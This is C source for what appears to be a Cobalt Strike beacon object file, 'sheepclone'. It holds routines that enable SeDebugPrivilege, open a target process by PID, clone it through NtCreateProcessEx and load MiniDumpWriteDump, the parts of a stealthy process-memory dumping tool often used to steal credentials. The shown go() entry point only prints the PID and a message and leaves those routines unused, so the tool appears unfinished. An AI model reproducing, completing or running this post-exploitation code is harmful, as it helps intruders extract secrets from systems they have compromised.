/*
* Compile with:
* cl.exe /c /GS- main.c /Fosheepclone.x64.o
*/

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "beacon.h"
 
// Imported WIN32 API
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI  ADVAPI32$OpenProcessToken();
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameW();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges();
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress();
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW();
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW();
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$CreateToolhelp32Snapshot();


// Define STATUS_SUCCESS if not already defined
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#endif

// Define NTAPI if not already defined
#ifndef NTAPI
#define NTAPI __stdcall
#endif

// Define UNICODE_STRING structure
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// Define CLIENT_ID structure
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// Define OBJECT_ATTRIBUTES structure
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// Define NtOpenProcess function pointer type
typedef NTSTATUS(NTAPI* PNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    );

// Global function pointer for NtOpenProcess
static PNtOpenProcess pNtOpenProcess = NULL;

// Define NtCreateProcessEx function pointer type
typedef NTSTATUS(NTAPI* PNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE TokenHandle,
    ULONG JobMemberLevel
    );

// Global function pointer for NtCreateProcessEx
static PNtCreateProcessEx pNtCreateProcessEx = NULL;

// Minimal MINIDUMP_TYPE definition and MiniDumpWriteDump signature
typedef enum _MINIDUMP_TYPE {
    MiniDumpNormal = 0x00000000,
    MiniDumpWithDataSegs = 0x00000001,
    MiniDumpWithFullMemory = 0x00000002,
    MiniDumpWithHandleData = 0x00000004,
    MiniDumpFilterMemory = 0x00000008,
    MiniDumpScanMemory = 0x00000010,
    MiniDumpWithUnloadedModules = 0x00000020,
    MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
    MiniDumpFilterModulePaths = 0x00000080,
    MiniDumpWithProcessThreadData = 0x00000100,
    MiniDumpWithPrivateReadWriteMemory = 0x00000200,
    MiniDumpWithoutOptionalData = 0x00000400,
    MiniDumpWithFullMemoryInfo = 0x00000800,
    MiniDumpWithThreadInfo = 0x00001000,
    MiniDumpWithCodeSegs = 0x00002000,
    MiniDumpWithoutAuxiliaryState = 0x00004000,
    MiniDumpWithFullAuxiliaryState = 0x00008000,
    MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
    MiniDumpIgnoreInaccessibleMemory = 0x00020000,
    MiniDumpWithTokenInformation = 0x00040000,
    MiniDumpWithModuleHeaders = 0x00080000,
    MiniDumpFilterTriage = 0x00100000,
    MiniDumpValidTypeFlags = 0x001fffff
} MINIDUMP_TYPE;

typedef BOOL(WINAPI* PMiniDumpWriteDump)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PVOID ExceptionParam,
    PVOID UserStreamParam,
    PVOID CallbackParam
    );

static PMiniDumpWriteDump pMiniDumpWriteDump = NULL;


// Check if a privilege is already enabled
BOOL IsPrivilegeEnabled(LPCWSTR privilegeName)
{
    HANDLE tokenHandle = NULL;
    DWORD bufferSize = 0;
    PTOKEN_PRIVILEGES privileges = NULL;
    BOOL found = FALSE;

    // Open process token
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
    {
        printf("\t[!] OpenProcessToken failed in IsPrivilegeEnabled! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    // Get required buffer size
    ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &bufferSize);
    privileges = (PTOKEN_PRIVILEGES)malloc(bufferSize);
    if (!privileges)
    {
        printf("\t[!] Memory allocation failed\n");
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    // Get privilege information
    if (!ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, privileges, bufferSize, &bufferSize))
    {
        printf("\t[!] GetTokenInformation failed! Error: %lu\n", KERNEL32$GetLastError());
        free(privileges);
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    // Check for the privilege
    for (DWORD i = 0; i < privileges->PrivilegeCount; i++)
    {
        WCHAR name[256];
        DWORD nameSize = sizeof(name) / sizeof(WCHAR);
        if (ADVAPI32$LookupPrivilegeNameW(NULL, &privileges->Privileges[i].Luid, name, &nameSize))
        {
            if (_wcsicmp(name, privilegeName) == 0)
            {
                found = TRUE;
                if (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
                {
                    wprintf(L"\t[i] Privilege '%s' is already enabled (Attributes: 0x%lx)\n", privilegeName, privileges->Privileges[i].Attributes);
                    free(privileges);
                    KERNEL32$CloseHandle(tokenHandle);
                    return TRUE;
                }
                break;
            }
        }
    }

    free(privileges);
    KERNEL32$CloseHandle(tokenHandle);
    if (!found)
    {
        wprintf(L"\t[!] Privilege '%s' not found in process token\n", privilegeName);
        return FALSE;
    }
    return FALSE;
}

// Enable Token Privileges
BOOL EnablePrivilege()
{
    LPCWSTR privilegeName = L"SeDebugPrivilege";
    HANDLE tokenHandle;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    // Check if privilege is already enabled
    if (IsPrivilegeEnabled(privilegeName))
    {
        wprintf(L"\t[i] No need to enable '%s'; it is already enabled\n", privilegeName);
        return TRUE;
    }

    // Open process token
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
    {
        printf("\t[!] OpenProcessToken Failed! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }
    printf("\t[i] Got Token handle: %p\n", tokenHandle);

    // Lookup privilege value
    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privilegeName, &luid))
    {
        wprintf(L"\t[!] LookupPrivilegeValueW Failed for '%s'! Error: %lu\n", privilegeName, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    // Set up privilege structure
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    printf("\t[i] Adjusting token privileges...\n");
    // Adjust token privileges
    if (!ADVAPI32$AdjustTokenPrivileges(tokenHandle, FALSE, &tp, 0, NULL, NULL))
    {
        printf("\t[!] AdjustTokenPrivileges Failed! Error: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    // Check for not all assigned error
    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("\t[!] Privilege not held by process token! Error: %lu\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    KERNEL32$CloseHandle(tokenHandle);
    wprintf(L"\t[i] Successfully enabled '%s'\n", privilegeName);
    return TRUE;
}

// Load NtOpenProcess function from ntdll.dll
BOOL LoadNtOpenProcess() {
    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    pNtOpenProcess = (PNtOpenProcess)KERNEL32$GetProcAddress(hNtdll, "NtOpenProcess");
    if (pNtOpenProcess == NULL) {
        printf("\t[!] Failed to get address of NtOpenProcess! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }
    printf("\t[i] Successfully loaded NtOpenProcess from ntdll.dll\n");
    return TRUE;
}

// Load NtCreateProcessEx from ntdll.dll
BOOL LoadNtCreateProcessEx() {
    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    pNtCreateProcessEx = (PNtCreateProcessEx)KERNEL32$GetProcAddress(hNtdll, "NtCreateProcessEx");
    if (pNtCreateProcessEx == NULL) {
        printf("\t[!] Failed to get address of NtCreateProcessEx! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }
    printf("\t[i] Successfully loaded NtCreateProcessEx from ntdll.dll\n");
    return TRUE;
}

// Load MiniDumpWriteDump from Dbghelp.dll
BOOL LoadMiniDumpWriteDump() {
    HMODULE hDbgHelp = KERNEL32$LoadLibraryW(L"Dbghelp.dll");
    if (hDbgHelp == NULL) {
        printf("\t[!] Failed to load Dbghelp.dll! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }

    pMiniDumpWriteDump = (PMiniDumpWriteDump)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (pMiniDumpWriteDump == NULL) {
        printf("\t[!] Failed to get address of MiniDumpWriteDump! Error: %lu\n", KERNEL32$GetLastError());
        return FALSE;
    }
    printf("\t[i] Successfully loaded MiniDumpWriteDump from Dbghelp.dll\n");
    return TRUE;
}

// Find Process Function
DWORD FindProcess(DWORD pid) {
    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("\t [!] Failed to create snapshot! Error Code: %u\n", KERNEL32$GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    DWORD foundPid = 0;

    if (Process32First(snapshot, &pe32)) {
        do {
            if (pe32.th32ProcessID == pid) {
                foundPid = pid;
                break;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    KERNEL32$CloseHandle(snapshot);
    return foundPid;
}


// Function to open a handle to the target process
NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
    OBJECT_ATTRIBUTES parentProcessObjectAttributes;
    CLIENT_ID parentProcessClientId;
    NTSTATUS ntStatus;

    // Initialize OBJECT_ATTRIBUTES manually
    parentProcessObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    parentProcessObjectAttributes.RootDirectory = NULL;
    parentProcessObjectAttributes.ObjectName = NULL;
    parentProcessObjectAttributes.Attributes = 0;
    parentProcessObjectAttributes.SecurityDescriptor = NULL;
    parentProcessObjectAttributes.SecurityQualityOfService = NULL;

    // Initialize CLIENT_ID
    parentProcessClientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    parentProcessClientId.UniqueThread = NULL;

    // Open handle to target process
    ntStatus = pNtOpenProcess(
        hProcess,
        PROCESS_CREATE_PROCESS,
        &parentProcessObjectAttributes,
        &parentProcessClientId
    );

    return ntStatus;
}


// Clone a process using NtCreateProcessEx, inheriting the parent's address space
NTSTATUS CloneProcess(HANDLE hParentProcess, PHANDLE hCloneProcess)
{
    OBJECT_ATTRIBUTES cloneObjectAttributes;

    cloneObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    cloneObjectAttributes.RootDirectory = NULL;
    cloneObjectAttributes.ObjectName = NULL;
    cloneObjectAttributes.Attributes = 0;
    cloneObjectAttributes.SecurityDescriptor = NULL;
    cloneObjectAttributes.SecurityQualityOfService = NULL;

    return pNtCreateProcessEx(
        hCloneProcess,
        PROCESS_ALL_ACCESS,
        &cloneObjectAttributes,
        hParentProcess,
        0,          // Flags
        NULL,       // SectionHandle (inherit image/VA space)
        NULL,       // DebugPort
        NULL,       // TokenHandle
        0           // JobMemberLevel (Reserved)
    );
}


void go(char * args, int length) {
	datap parser; 
	char* str_arg;
	int num_arg;

	// Beacon API for data parser
	BeaconDataParse(&parser, args, length);
	str_arg = BeaconDataExtract(&parser, NULL);
	num_arg = BeaconDataInt(&parser);

	DWORD pid = KERNEL32$GetCurrentProcessId();

	// print out the PID
	BeaconPrintf(CALLBACK_OUTPUT, "Current Process at %d (PID)", pid);

	// Print out message with CNA file
	BeaconPrintf(CALLBACK_OUTPUT, "Message is: %s written with %d arg", str_arg, num_arg);
}
